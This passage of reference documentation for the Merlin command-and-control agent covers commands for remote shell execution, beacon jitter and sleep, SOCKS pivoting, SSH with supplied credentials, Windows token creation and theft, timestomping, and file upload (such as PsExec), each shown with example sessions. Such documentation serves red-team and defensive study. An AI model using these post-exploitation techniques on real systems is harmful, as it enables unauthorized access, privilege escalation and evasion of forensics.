The command be executed in both of these ways:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe "Get-Service -Name win* -Exclude WinRM | fl"

**OR**

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe "Get-Service -Name \"win*\" -Exclude "WinRM" | fl"

**OR**

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe 'Get-Service -Name \'win*\' -Exclude 'WinRM' | fl'

Escape Sequence
^^^^^^^^^^^^^^^

Following along with the Quoted Arguments section above, the ``\`` symbol will be interpreted as an escape sequence.
This is beneficial because it can be used to escape other characters like the pipe symbol, ``|`` .
However, it can work against you when working with Windows file paths and the arguments are not enclosed in quotes.

This command will fail because the ``\`` itself needs to escaped. Notice the error message shows File Not Found:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir C:\Windows\System32
    [-]Created job hBYxRfaRBG for agent 21a0fc5f-14ad-4c43-b41e-57eab1feb0e1
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job hBYxRfaRBG
    [+]  Volume in drive C has no label.
     Volume Serial Number is AC57-CFB9

     Directory of C:\

    File Not Found

To correctly issue the command either escape the ``\`` or enclose the commands in quotes:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir C:\\Windows\\System32

.. _skew:

skew
----

The ``skew`` command is used to introduce a jitter or skew to the agent sleep time to keep traffic from occurring at exact time intervals.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» skew 5
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-]Created job lyYQdxckTY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

.. _sleep:

sleep
-----

The ``sleep`` control type is used to change the amount of time that an agent will sleep before checking in again. The default is 30 seconds. The values provided to this command are written in a time format. For example, ``30s`` is 30 seconds and ``60m`` is 60 minutes. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sleep 15s
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-]Created job npMYqwASOD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

socks
-----

The ``socks`` command is used to start, stop, or list SOCKS5 listeners. There can only be one SOCKS5 listener per agent.

* :ref:`socks list`
* :ref:`socks start`
* :ref:`socks stop`

.. _socks list:

list
^^^^

The ``list`` command will list active SOCKS5 listeners per agent. If the SOCKS5 listener was configured to listen on
all interfaces (e.g., 0.0.0.0), then the interface will be listed as ``[::]:``.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks list
    [i]
            Agent                           Interface:Port
    ==========================================================
    c1090dbc-f2f7-4d90-a241-86e0c0217786    127.0.0.1:9050
    7be9defd-29b8-46ee-8d38-0f3805e9233f    [::]:9051
    6d8a3a59-e484-40b3-977b-530b351106a6    192.168.1.100:9053

.. _socks start:

start
^^^^^

.. warning::
    SOCKS5 listeners do not require authentication. Control access accordingly using firewall rules or SSH tunnels.

.. note::
    In most cases you should only bind to the loopback adapter, 127.0.0.1, to prevent unintentionally exposing the port.

The ``start`` command will start a SOCKS5 listener for the current agent. This command takes an optional third argument
of the interface and port, or just the port, that you want to bind the listener to. If a third argument is not provided
the listener will default to listen on ``127.0.0.1:9050``.



.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks start
    [-] Started SOCKS listener for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 on 127.0.0.1:9050

.. code-block:: text

    Merlin[agent][7be9defd-29b8-46ee-8d38-0f3805e9233f]» socks start 0.0.0.0:9051
    [-] Started SOCKS listener for agent 7be9defd-29b8-46ee-8d38-0f3805e9233f on 0.0.0.0:9051

.. _socks stop:

stop
^^^^

The ``stop`` command will stop and remove the SOCKS5 listener for the current agent.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks stop
    [-] Successfully stopped SOCKS listener for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 on 127.0.0.1:9055


ssh
---

The ``ssh`` command connects to target host over the SSH protocol, executes the provided command, and returns the results.

.. warning::
    This command is insecure by design because it does not validate the remote host's public key

``ssh <username> <password> <host:port> <program> [<args>]``

.. code-block:: text

    Merlin[agent][fbef5b71-50bb-4d36-8a1b-2edf233eb578]» ssh rastley S3cretPassw0rd 192.168.100.123:22 /bin/sh -c \"ip address show eth0\"
    [-] Created job pinIDJXDTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job pinIDJXDTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Connected to 192.168.100.123:22 at 192.168.100.123:22 with public key ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJytZseMSAsUU6OE2X4TC518fcF3yxgFYIgYp4+xT9pa9n5449gcsKT/eO3hx9NXAtyOHImg/Ff8kdWs52bU3SA=
    0: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
        link/ether 00:0c:29:z3:ff:91 brd ff:ff:ff:ff:ff:ff
        inet 192.168.100.70/24 brd 192.168.100.255 scope global dynamic noprefixroute eth0
           valid_lft 1781sec preferred_lft 1781sec

status
------

The ``status`` command is used to simply print if the Merlin Agent is Active, Delayed, or Dead to the screen. This becomes useful when you come back to Merlin after a couple of hours or if you want to see if your shell has died.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» status
    Active
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»

token
-----

The ``token`` command is used to perform various operations with Windows `access tokens <https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens>`_.
The following commands are available:

* :ref:`token make`
* :ref:`token privs`
* :ref:`token rev2self`
* :ref:`token steal`
* :ref:`token whoami`

Merlin keeps track of when a Windows access token was created or stolen. If there is a created or stolen token, it will be used with the following commands:

* :ref:`cd`
* :ref:`download`
* :ref:`execute-assembly`
* :ref:`execute-pe`
* :ref:`execute-shellcode`
* :ref:`invoke-assembly`
* minidump
* :ref:`kill`
* :ref:`ls`
* :ref:`ps`
* :ref:`rm`
* :ref:`run`
* :ref:`shell`
* :ref:`touch`
* :ref:`upload`

The following commands will make the Windows `CreateProcessWithTokenW <https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw>`_ API call:

* :ref:`execute-assembly`
* :ref:`execute-pe`
* :ref:`execute-shellcode`
* :ref:`run`
* :ref:`shell`

.. _token make:

make
^^^^

The ``make`` command is use to create a new Windows access token with the Windows `LogonUserW <https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw>`_ API call. The token is created with a type ``9 - NewCredentials`` `logon type <https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types>`_. This is the equivalent of using ``runas.exe /netonly``.

.. warning::
    Type 9 - NewCredentials tokens only work for **NETWORK** authenticated activities

.. note::
    Commands such as ``token whoami`` will show the username for the process and not the created token due to the logon type, but will reflect the new Logon ID

.. note::
    There is an unregistered ``make_token`` command alias that can be use from the agent root menu prompt

``token make <DOMAIN\\User> <password>``

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token make ACME\\Administrator S3cretPassw0rd
    [-] Created job piloeJbKPp for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job piloeJbKPp for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Successfully created a Windows access token for ACME\Administrator with a logon ID of 0xA703CF0

.. _token privs:

privs
^^^^^

The ``privs`` command enumerates the privilege associated with either the current process or a remote process.
If the current process has a created or stolen, and process ID argument is not provided, then the applied token's
privileges will be enumerated.

``token privs [<PID>]``

Current process:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token privs
    [-] Created job rBIkAAWkIr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job rBIkAAWkIr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Process ID 6892 access token integrity level: High, privileges (24):
            Privilege: SeIncreaseQuotaPrivilege, Attribute:
            Privilege: SeSecurityPrivilege, Attribute:
            Privilege: SeTakeOwnershipPrivilege, Attribute:
            Privilege: SeLoadDriverPrivilege, Attribute:
            Privilege: SeSystemProfilePrivilege, Attribute:
            Privilege: SeSystemtimePrivilege, Attribute:
            Privilege: SeProfileSingleProcessPrivilege, Attribute:
            Privilege: SeIncreaseBasePriorityPrivilege, Attribute:
            Privilege: SeCreatePagefilePrivilege, Attribute:
            Privilege: SeBackupPrivilege, Attribute:
            Privilege: SeRestorePrivilege, Attribute:
            Privilege: SeShutdownPrivilege, Attribute:
            Privilege: SeDebugPrivilege, Attribute: SE_PRIVILEGE_ENABLED
            Privilege: SeSystemEnvironmentPrivilege, Attribute:
            Privilege: SeChangeNotifyPrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
            Privilege: SeRemoteShutdownPrivilege, Attribute:
            Privilege: SeUndockPrivilege, Attribute:
            Privilege: SeManageVolumePrivilege, Attribute:
            Privilege: SeImpersonatePrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
            Privilege: SeCreateGlobalPrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
            Privilege: SeIncreaseWorkingSetPrivilege, Attribute:
            Privilege: SeTimeZonePrivilege, Attribute:
            Privilege: SeCreateSymbolicLinkPrivilege, Attribute:
            Privilege: SeDelegateSessionUserImpersonatePrivilege, Attribute:

Remote process:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token privs 8156
    [-] Created job BAKadQhkOc for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job BAKadQhkOc for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Process ID 8156 access token integrity level: Low, privileges (2):
            Privilege: SeChangeNotifyPrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
            Privilege: SeIncreaseWorkingSetPrivilege, Attribute:

.. _token rev2self:

rev2self
^^^^^^^^

The ``rev2self`` command leverages the `RevertToSelf <https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself>`_
Windows API function and releases, or drops, any access token that have been created or stolen.

.. note::
    There is an unregistered ``rev2self`` command alias that can be use from the agent root menu prompt

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token rev2self
    [-] Created job ZXKyKuIZru for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job ZXKyKuIZru for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Successfully reverted to self and dropped the impersonation token


.. _token steal:

steal
^^^^^

The ``steal`` command obtains a handle to a remote process' access token, duplicates it through the
`DuplicateTokenEx <https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex>`_
Windows API, and subsequently uses it to perform future post-exploitation commands.

.. note::
    There is an unregistered ``steal_token`` command alias that can be use from the agent root menu prompt

``token steal <PID>``

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token steal 1320
    [-] Created job xBDIToajju for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job xBDIToajju for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Successfully stole token from PID 1320 for user ACME\Administrator with LogonID 0x39DF3C

.. _token whoami:

whoami
^^^^^^

The ``whoami`` command leverages the Windows `GetTokenInformaion <https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation>`_ API call to return information
about both the process and thread Windows access token. This information includes:

* Username
* Token ID
* Logon ID
* Privilege Count
* Group Count
* Token Type
* Token Impersonation Level
* Integrity Level

``token whoami``

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token whoami
    [-] Created job UZXXIILnYD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job UZXXIILnYD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Process (Primary) Token:
            User: ACME\rastley,Token ID: 0x9CA475E,Logon ID: 0x26C3A6,Privilege Count: 24,Group Count: 14,Type: Primary,Impersonation Level: Anonymous,Integrity Level: High
    Thread (Primary) Token:
            User: NT AUTHORITY\SYSTEM,Token ID: 0x9CC08EB,Logon ID: 0x3E7,Privilege Count: 28,Group Count: 4,Type: Primary,Impersonation Level: Impersonation,Integrity Level: System

.. _touch:

touch
-----

The ``touch`` command is used to duplicate a timestamp from one file to another. This technique is also known as timestomp

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell ls -la /tmp/deleteMe.txt
    [-] Created job hEXYmbbGpW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job hEXYmbbGpW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] -rw-rw-r-- 1 rastley rastley 0 Aug  2 20:11 /tmp/deleteMe.txt

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» touch /etc/passwd /tmp/deleteMe.txt
    [-] Created job Canvuiuoxj for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job Canvuiuoxj for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] File: /tmp/deleteMe.txt
    Last modified and accessed time set to: 2020-09-16 07:05:18.245022776 -0400 EDT

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell ls -la /tmp/deleteMe.txt
    [-] Created job gTFZbcgeJW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job gTFZbcgeJW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] -rw-rw-r-- 1 rastley rastley 0 Sep 16  2020 /tmp/deleteMe.txt

.. _upload:

upload
------

The ``upload`` command is used to upload a file *from* the Merlin server *to* the host where the Merlin agent is running. The command is called by proving the location of the file on the Merlin server followed by the location to save the file on the host where the Merlin agent is running.

.. note::
    Because ``\`` is used to escape a character, file paths require two (e.g., ``C:\\Windows``)

.. note::
    Enclose file paths containing a space with quotation marks (e.g.,. ``"C:\\Windows\\Program Files\\"``)

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» upload C:\\SysinternalsSuite\\PsExec.exe C:\\Windows\\PsExec.exe
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job vXJsZdZLPP for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

uptime
------

.. note::
    This command is only available to agent running on a ``Windows`` operating system!

The ``uptime`` command uses the Windows API GetTickCount64 method to determine how long the host has been running.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» uptime
    [-] Created job GJwrXttowA for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job GJwrXttowA for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
    System uptime: 853h31m14.921s

!
-

Any command that begins with a ``!`` (a.k.a bang or exclamation point) will be executed on host itself where the Merlin server is running. This is useful when you want simple information, such as your interface address, without having to open a new terminal.

.. code-block:: text

    Merlin» !ip a show ens32

    [i] Executing system command...

    [+] 2: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
        link/ether 00:0c:29:z3:ff:91 brd ff:ff:ff:ff:ff:ff
        inet 192.168.211.221/24 brd 192.168.211.255 scope global dynamic noprefixroute ens32
           valid_lft 1227sec preferred_lft 1227sec
        inet6 fe80::a71d:1f6a:a0d1:7985/64 scope link noprefixroute
           valid_lft forever preferred_lft forever

    Merlin»
